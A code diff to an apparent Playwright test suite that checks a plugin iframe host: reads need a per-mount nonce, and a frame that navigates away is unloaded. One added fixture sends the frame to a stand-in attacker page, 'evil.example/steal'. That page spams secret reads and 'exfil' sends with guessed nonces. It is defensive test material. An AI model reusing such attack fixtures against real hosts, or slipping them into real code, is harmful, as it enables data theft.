@@ -67,22 +67,29 @@ test("a plugin's frame component renders inline with no console rebuild", async 
 // plugin's route and core /api — and nothing the frame receives carries the operator's bearer.
 const E2E_BEARER = "E2E-BEARER-never-in-the-frame";
 
+// The fixture frame waits for `protoComponent:init`, keeps the per-mount `nonce` it carries and
+// echoes it on every read (#4143 F1) — exactly what a real frame component must do.
 const READ_FRAME_HTML =
   "<!doctype html><html><body style='margin:0'>" +
   "<pre id='read-out'>waiting</pre>" +
   "<script>" +
-  "var results = {};" +
+  "var results = {}; var started = false;" +
   "addEventListener('message', function (e) {" +
   "  var d = e.data;" +
+  "  if (d && d.type === 'protoComponent:init' && !started) {" +
+  "    started = true; var n = d.nonce;" +
+  "    parent.postMessage({ type: 'protoComponent:read', cid: 1, path: 'features/x', nonce: n }, '*');" +
+  "    parent.postMessage({ type: 'protoComponent:read', cid: 2, path: 'features/x/secret-sub', nonce: n }, '*');" +
+  "    parent.postMessage({ type: 'protoComponent:read', cid: 3, path: '../other/features', nonce: n }, '*');" +
+  "    parent.postMessage({ type: 'protoComponent:read', cid: 4, path: '/api/config', nonce: n }, '*');" +
+  "    parent.postMessage({ type: 'protoComponent:read', cid: 5, path: 'features/x' }, '*');" +
+  "    return;" +
+  "  }" +
   "  if (!d || d.type !== 'protoComponent:readResult') return;" +
   "  results[d.cid] = d;" +
   "  document.getElementById('read-out').textContent = JSON.stringify(results);" +
   "});" +
   "parent.postMessage({ type: 'protoComponent:height', height: 160 }, '*');" +
-  "parent.postMessage({ type: 'protoComponent:read', cid: 1, path: 'features/x' }, '*');" +
-  "parent.postMessage({ type: 'protoComponent:read', cid: 2, path: 'features/x/secret-sub' }, '*');" +
-  "parent.postMessage({ type: 'protoComponent:read', cid: 3, path: '../other/features' }, '*');" +
-  "parent.postMessage({ type: 'protoComponent:read', cid: 4, path: '/api/config' }, '*');" +
   "</script></body></html>";
 
 test("a frame component reads its declared plugin route through the host, and nothing else", async ({ page }) => {
@@ -120,7 +127,7 @@ test("a frame component reads its declared plugin route through the host, and no
   await host.scrollIntoViewIfNeeded();
 
   const out = page.frameLocator('[data-testid="frame-component-host"] iframe').locator("#read-out");
-  await expect(out).toContainText('"4"');
+  await expect(out).toContainText('"5"');
   const results = JSON.parse((await out.textContent()) || "{}") as Record<string, Record<string, unknown>>;
 
   // The allowlisted path is served — the host made an authed GET on the frame's behalf…
@@ -129,8 +136,82 @@ test("a frame component reads its declared plugin route through the host, and no
   expect(seen[0].auth).toBe(`Bearer ${E2E_BEARER}`);
   // …and a deeper path, another plugin's route and core /api are refused without a request.
   for (const cid of ["2", "3", "4"]) expect(results[cid]).toMatchObject({ ok: false, status: 0 });
+  // …and a read without the mount's nonce is refused too.
+  expect(results["5"]).toMatchObject({ ok: false, status: 0, error: "missing or invalid nonce" });
   expect(forbidden).toEqual([]);
   // The frame never sees the bearer (or any header) in what it was sent.
   expect(JSON.stringify(results)).not.toContain(E2E_BEARER);
   expect(JSON.stringify(results).toLowerCase()).not.toContain("authorization");
+});
+
+// A frame that NAVIGATES ITSELF must not take the plugin's reads with it (#4143 review F1): a
+// WindowProxy keeps its identity across navigation, so `e.source` alone can't tell the plugin page
+// from whatever replaced it. The plugin page reads once (with its nonce), then navigates to a
+// third-party page that hammers protoComponent:read/send without (and with a guessed) nonce. The
+// host must serve none of it, never hand the new page an init, and unload the frame.
+const NAV_FRAME_HTML =
+  "<!doctype html><html><body style='margin:0'><pre id='nav-out'>waiting</pre><script>" +
+  "addEventListener('message', function (e) {" +
+  "  var d = e.data;" +
+  "  if (d && d.type === 'protoComponent:init') {" +
+  "    parent.postMessage({ type: 'protoComponent:read', cid: 1, path: 'features/x', nonce: d.nonce }, '*');" +
+  "  }" +
+  "  if (d && d.type === 'protoComponent:readResult' && d.cid === 1) {" +
+  "    document.getElementById('nav-out').textContent = 'FIRST ' + JSON.stringify(d);" +
+  "    setTimeout(function () { location.href = 'https://evil.example/steal'; }, 50);" +
+  "  }" +
+  "});" +
+  "parent.postMessage({ type: 'protoComponent:height', height: 120 }, '*');" +
+  "</script></body></html>";
+
+const EVIL_HTML =
+  "<!doctype html><html><body><script>" +
+  "var i = 0;" +
+  "function hit() {" +
+  "  i += 1;" +
+  "  parent.postMessage({ type: 'protoComponent:read', cid: 100 + i, path: 'features/secret' }, '*');" +
+  "  parent.postMessage({ type: 'protoComponent:read', cid: 200 + i, path: 'features/secret', nonce: 'guess' }, '*');" +
+  "  parent.postMessage({ type: 'protoComponent:send', cid: 300 + i, text: 'exfil', nonce: 'guess' }, '*');" +
+  "}" +
+  "hit(); setInterval(hit, 20);" +
+  "</script></body></html>";
+
+test("a frame that navigates away is refused every read and unloaded", async ({ page }) => {
+  await page.route("**/api/components", (route) =>
+    route.fulfill({
+      json: [{ name: "pl-demo-widget", plugin: "demo", frame_url: "/plugins/demo/widget", reads: ["features/*"] }],
+    }),
+  );
+  await page.route("**/plugins/demo/widget*", (route) => route.fulfill({ contentType: "text/html", body: NAV_FRAME_HTML }));
+  await page.route("https://evil.example/**", (route) => route.fulfill({ contentType: "text/html", body: EVIL_HTML }));
+  let firstReads = 0;
+  await page.route("**/api/plugins/demo/features/x", (route) => {
+    firstReads += 1;
+    return route.fulfill({ json: { id: "x" } });
+  });
+  let stolen = 0;
+  await page.route("**/api/plugins/demo/features/secret", (route) => {
+    stolen += 1;
+    return route.fulfill({ json: { private: "board data" } });
+  });
+
+  await page.goto("/app/", { waitUntil: "load" });
+  const composer = page.getByPlaceholder(/Message protoAgent/i);
+  await composer.waitFor({ state: "visible" });
+  await composer.fill("FRAMEKIND demo");
+  await composer.press("Enter");
+  const host = page.getByTestId("frame-component-host");
+  await expect(host).toBeVisible();
+  await host.scrollIntoViewIfNeeded();
+
+  // The first (plugin) document works…
+  await expect.poll(() => firstReads).toBe(1);
+  // …then it navigates itself: the host notices the second load, revokes the capability and
+  // unloads the frame for a "navigated away" notice.
+  await expect(page.getByTestId("frame-component-navigated")).toBeVisible();
+  await expect(host.locator("iframe")).toHaveCount(0);
+  await page.waitForTimeout(300);
+  expect(stolen).toBe(0);
+  expect(firstReads).toBe(1);
+  await expect(page.getByTestId("component-send-confirm")).toHaveCount(0);
 });
